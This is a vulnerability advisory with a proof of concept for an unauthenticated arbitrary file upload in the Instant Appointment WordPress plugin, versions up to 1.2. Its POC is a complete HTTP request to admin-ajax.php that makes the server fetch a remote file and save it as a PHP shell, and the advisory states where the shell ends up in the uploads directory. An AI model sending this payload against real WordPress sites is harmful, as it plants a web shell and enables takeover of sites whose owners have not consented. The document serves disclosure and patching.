# instant-appointment-arbitrary-file-upload
instant-appointment - Arbitrary File upload


# Description

The Instant Appointment plugin for WordPress is vulnerable to Arbitrary File upload in versions up to, and including, 1.2.  This makes it possible for unauthenticated attackers to upload a shell and execute commands.

## Details

- **Type**: plugin
- **Slug**: instant-appointment
- **Affected Version**: 1.2
- **CVSS Score**: 9.8
- **CVSS Rating**: High
- **CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
- **CVE**: 
- **Status**: Closed

POC
---

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: wp-dev.ddev.site
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
Cache-Control: max-age=0
Content-Length: 108

action=add_gallery_to_vendor&user_galerie[0][1]=https://rfi.nessus.org/rfi.txt&user_galerie[0][0]=shell2.php
```

File will be in uploads/2025/1/shell2.php file.
